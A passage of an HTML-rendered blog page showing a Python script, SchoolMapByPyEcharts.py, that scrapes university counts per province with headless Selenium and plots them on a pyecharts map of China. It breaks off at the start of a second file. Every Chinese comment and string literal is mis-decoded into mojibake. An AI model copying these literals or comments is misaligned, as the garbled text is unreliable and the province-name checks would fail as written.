class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding: utf-8</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">@author: Brian</span></span><br><span class=\"line\"><span class=\"string\">@file: SchoolMapByPyEcharts.py</span></span><br><span class=\"line\"><span class=\"string\">@time: 2020/6/26 15:06</span></span><br><span class=\"line\"><span class=\"string\">@desc: é‡æ–°é€‰æ‹©çˆ¬å–æ–¹æ³•ï¼Œæ›´å¥½çš„ä¸ºå¯è§†åŒ–æä¾›æ•°æ®</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.chrome.options <span class=\"keyword\">import</span> Options</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.support.ui <span class=\"keyword\">import</span> Select</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyecharts <span class=\"keyword\">import</span> options <span class=\"keyword\">as</span> opts</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyecharts.charts <span class=\"keyword\">import</span> Map</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyecharts.commons.utils <span class=\"keyword\">import</span> JsCode</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SchoolMap</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, url, mldm, yjxkdm)</span>:</span></span><br><span class=\"line\">        self.url = url</span><br><span class=\"line\">        self.mldm = mldm</span><br><span class=\"line\">        self.yjxkdm = yjxkdm</span><br><span class=\"line\">        self.FlagOfProcess = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># é…ç½® driver</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_driver</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        chrome_options = Options()</span><br><span class=\"line\">        chrome_options.add_argument(<span class=\"string\">\"--headless\"</span>)</span><br><span class=\"line\">        chrome_options.add_argument(<span class=\"string\">\"--disable-gpu\"</span>)</span><br><span class=\"line\">        driver = webdriver.Chrome(executable_path=<span class=\"string\">\"E:/Program Files/chromedriver_win32/chromedriver.exe\"</span>,</span><br><span class=\"line\">                                  chrome_options=chrome_options)</span><br><span class=\"line\">        driver.get(self.url)</span><br><span class=\"line\">        driver = self.set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> driver</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å°†è®¾ç½®å±å¹•å¤§å°ç‹¬ç«‹å‡ºæ¥ï¼Œæ–¹ä¾¿æ¯æ¬¡è·³è½¬å®Œä½¿ç”¨</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_height_width</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        width = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollWidth\"</span>)</span><br><span class=\"line\">        height = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollHeight\"</span>)</span><br><span class=\"line\">        driver.set_window_size(width, height)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> driver</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å¦‚æœéœ€è¦ç¿»é¡µå°±ç¿»é¡µ</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">paging</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='ch-page']\"</span>)</span><br><span class=\"line\">        li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(\"å½“å‰é¡µé¢ç¿»é¡µå…ƒç´ é•¿åº¦ï¼š\" + str(len(li)))</span></span><br><span class=\"line\">        <span class=\"comment\"># ç¬¬ä¸€é¡µå³ä¸‹è§’çš„æ ‡ç­¾æ•°é‡æœ€å¤§ä¸º10ï¼Œå°äº10æ—¶æ²¡æœ‰ Go è¾“å…¥è·³è½¬æ¡†</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(len(li) &lt; <span class=\"number\">10</span>):</span><br><span class=\"line\">            pagenumber = int(li[<span class=\"number\">-2</span>].text)</span><br><span class=\"line\">        <span class=\"comment\"># print(pagenumber)</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            pagenumber = int(li[<span class=\"number\">-3</span>].text)</span><br><span class=\"line\">        <span class=\"comment\"># print(\"å½“å‰é¡µæ•°ï¼š\" + str(pagenumber))</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> pagenumber</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å¤é€‰æ¡†æ¡ä»¶é€‰æ‹©ï¼Œé€šè¿‡åŸå¸‚ï¼Œé—¨ç±»ã€å­¦ç§‘ç±»åˆ«æ¥åŒºåˆ†</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">select_option</span><span class=\"params\">(self, driver, count)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># https://selenium-python-zh.readthedocs.io/en/latest/api.html</span></span><br><span class=\"line\">        <span class=\"comment\"># ä½¿ç”¨ Select å¤„ç†ä¸‹æ‹‰æ¡†çš„é€‰é¡¹</span></span><br><span class=\"line\">        <span class=\"comment\"># å…ˆé€šè¿‡ Xpath æ‰¾åˆ° select æ ‡ç­¾ï¼Œç„¶åé€šè¿‡ value æ‰¾åˆ°å¯¹åº”å€¼å³å¯é€‰æ‹©</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"comment\"># print(\"å½“å‰æ­£åœ¨é€‰æ‹©çš„åŸå¸‚ä»£ç ä¸ºï¼š \" + count)</span></span><br><span class=\"line\">            Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='ssdm']\"</span>)).select_by_value(count)</span><br><span class=\"line\">            Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='mldm']\"</span>)).select_by_value(self.mldm)</span><br><span class=\"line\">            Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='yjxkdm']\"</span>)).select_by_value(self.yjxkdm)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°æŸ¥è¯¢æŒ‰é’®è¿›è¡Œç‚¹å‡»</span></span><br><span class=\"line\">            driver.find_element_by_xpath(<span class=\"string\">\"//input[@name='button']\"</span>).click()</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># ç‚¹å‡»å®Œè¿˜æ˜¯åœ¨ä¸€ä¸ª tab é‡Œï¼Œ handle ä¹Ÿä¸€æ ·</span></span><br><span class=\"line\">            <span class=\"comment\"># æ¡ä»¶é€‰æ‹©å®Œä¹‹åå¼€å§‹ç»Ÿè®¡æ•°é‡</span></span><br><span class=\"line\">            counts = self.count_city(driver)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"é€‰æ‹©æ¡ä»¶å‡ºç°é”™è¯¯ï¼Œè¯·æ£€æŸ¥é—¨ç±»ä»£ç ä¸å­¦ç§‘ç±»åˆ«ä»£ç å¯¹åº”å…³ç³»æ˜¯å¦æ­£ç¡®ï¼ç¨‹åºå³å°†é€€å‡º...\"</span>.rjust(<span class=\"number\">50</span>, <span class=\"string\">'*'</span>))</span><br><span class=\"line\">        <span class=\"comment\"># print(\"å½“å‰åŸå¸‚çš„å­¦æ ¡æ•°é‡ï¼š\" + str(counts))</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> counts</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># è¿”å›å½“å‰æ‰€é€‰æ‹©åŸå¸‚å¼€è®¾ç›®æ ‡ä¸“ä¸šçš„é«˜æ ¡æ•°é‡</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">count_city</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        counts = <span class=\"number\">0</span></span><br><span class=\"line\">        self.FlagOfProcess = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"comment\"># ä¸ç”¨ä¸‹ä¸€é¡µæ“ä½œ</span></span><br><span class=\"line\">                numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                counts = len(numbers)</span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                self.FlagOfProcess = <span class=\"literal\">False</span></span><br><span class=\"line\">                print(<span class=\"string\">\"æŸ¥æ‰¾å¤±è´¥ï¼Œè¯·æ£€æŸ¥å½“å‰é¡µé¢æ˜¯å¦ä¸ºç©ºï¼\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> (pagenumber &lt; <span class=\"number\">7</span>):</span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°ä¸‹ä¸€é¡µæŒ‰é’®</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (pagenumber):</span><br><span class=\"line\">                numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                counts += len(numbers)</span><br><span class=\"line\">                ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='ch-page']\"</span>)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># ä¸‹ä¸€é¡µæŒ‰é’®ä½ç½®ä¸åŒ,ç”¨ Go</span></span><br><span class=\"line\">            flag = <span class=\"number\">2</span>  <span class=\"comment\"># ä¸‹ä¸€æ¬¡è¦Goçš„é¡µç </span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (pagenumber):</span><br><span class=\"line\">                numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                <span class=\"comment\"># å®šä½é¡µç </span></span><br><span class=\"line\">                counts += len(numbers)</span><br><span class=\"line\">                driver.find_element_by_css_selector(<span class=\"string\">\"#goPageNo\"</span>).send_keys(str(flag))  <span class=\"comment\"># è¾“å…¥é¡µç è·³è½¬</span></span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='page-btn']\"</span>).click()  <span class=\"comment\"># ç‚¹å‡» Goï¼Œä»ç„¶åŒæ˜¯ä¸€ä¸ª window_handle</span></span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">                flag += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> counts</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># è¿”å›æ‰€æœ‰åŸå¸‚ä»£ç ï¼Œç„¶åéå†åŸå¸‚ï¼Œå¾—åˆ°é«˜æ ¡æ•°é‡</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">select_major</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># è®°å½•æ‰€æœ‰çš„åŸå¸‚ä»£ç </span></span><br><span class=\"line\">        city_value = []</span><br><span class=\"line\">        <span class=\"comment\"># è®°å½•æ‰€æœ‰åŸå¸‚åå­—</span></span><br><span class=\"line\">        city_name = []</span><br><span class=\"line\">        <span class=\"comment\"># åŸå¸‚çš„é«˜æ ¡æ•°é‡</span></span><br><span class=\"line\">        school_counts = []</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> len(driver.window_handles) == <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># é€‰æ‹©çœå¸‚</span></span><br><span class=\"line\">        options = driver.find_element_by_css_selector(<span class=\"string\">\"#ssdm\"</span>)</span><br><span class=\"line\">        option = options.find_elements_by_xpath(<span class=\"string\">\"option\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> city <span class=\"keyword\">in</span> option[<span class=\"number\">1</span>::]:</span><br><span class=\"line\">            city_name.append(city.get_attribute(<span class=\"string\">\"textContent\"</span>))</span><br><span class=\"line\">            city_value.append(city.get_attribute(<span class=\"string\">\"value\"</span>))</span><br><span class=\"line\">        <span class=\"comment\"># print(city_name, city_value)</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># éå†åŸå¸‚ä»£ç ï¼Œä¼ å…¥ç»Ÿè®¡é«˜æ ¡æ•°é‡çš„å‡½æ•°</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> count <span class=\"keyword\">in</span> city_value:</span><br><span class=\"line\">            counts = self.select_option(driver, count)</span><br><span class=\"line\">            school_counts.append(counts)</span><br><span class=\"line\">        <span class=\"comment\"># print(school_counts)</span></span><br><span class=\"line\"></span><br><span class=\"line\">        driver.close()</span><br><span class=\"line\">        driver.quit()</span><br><span class=\"line\">        print(<span class=\"string\">\"æ­£åœ¨å‡†å¤‡ç»˜åˆ¶å›¾è¡¨...\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> city_name, school_counts</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># æ•°æ®å¯è§†åŒ–</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visulize</span><span class=\"params\">(self, city_name, school_counts,)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(self.FlagOfProcess):</span><br><span class=\"line\">            realcity = []</span><br><span class=\"line\">            <span class=\"comment\"># å¤„ç†åŸå¸‚åï¼Œåªä¿ç•™ä¸¤å­—æˆ–ä¸‰å­—åç§°</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> citys <span class=\"keyword\">in</span> city_name:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">\"é»‘é¾™æ±Ÿ\"</span> <span class=\"keyword\">in</span> citys:</span><br><span class=\"line\">                    a = <span class=\"string\">\"é»‘é¾™æ±Ÿ\"</span></span><br><span class=\"line\">                <span class=\"keyword\">elif</span> <span class=\"string\">\"å†…è’™å¤\"</span> <span class=\"keyword\">in</span> citys:</span><br><span class=\"line\">                    a = <span class=\"string\">\"å†…è’™å¤\"</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    a = citys[<span class=\"number\">4</span>:<span class=\"number\">6</span>]</span><br><span class=\"line\">                realcity.append(a)</span><br><span class=\"line\">            <span class=\"comment\"># print(realcity)</span></span><br><span class=\"line\">            <span class=\"comment\"># å°†æ•°æ®å¤„ç†æˆåˆ—è¡¨</span></span><br><span class=\"line\">            list1 = [[realcity[i], school_counts[i]] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(realcity))]</span><br><span class=\"line\">            <span class=\"comment\"># print(list1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">            map_1 = Map()</span><br><span class=\"line\">            map_1.set_global_opts(</span><br><span class=\"line\">                title_opts=opts.TitleOpts(title=<span class=\"string\">\"2020é«˜æ ¡åˆ†å¸ƒ\"</span>),</span><br><span class=\"line\">                visualmap_opts=opts.VisualMapOpts(max_=<span class=\"number\">40</span>)  <span class=\"comment\"># æœ€å¤§æ•°æ®èŒƒå›´</span></span><br><span class=\"line\">            )</span><br><span class=\"line\">            map_1.add(<span class=\"string\">\"2020é«˜æ ¡åˆ†å¸ƒ\"</span>, list1, maptype=<span class=\"string\">\"china\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># map_1.add_js_funcs(\"window.confirm()\")</span></span><br><span class=\"line\">            map_1.render(<span class=\"string\">'SchoolMap.html'</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"ç»˜åˆ¶æˆåŠŸï¼Œè¯·åœ¨åŒçº§ç›®å½•ä¸‹æŸ¥çœ‹ SchoolMap.html æ–‡ä»¶ï¼\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"å‡ºç°é”™è¯¯ï¼Œåœæ­¢ç»˜åˆ¶å›¾è¡¨ï¼\"</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>ResearchDirectionsByPyEcharts.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding: utf-8</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">@author: Brian</span></span><br><span class=\"line\"><span class=\"string\">@file: ResearchDirectionsByPyEcharts.py</span></span><br><span class=\"line\"><span class=\"string\">@time: 2020/6/27 15:38</span></span><br><span class=\"line\"><span 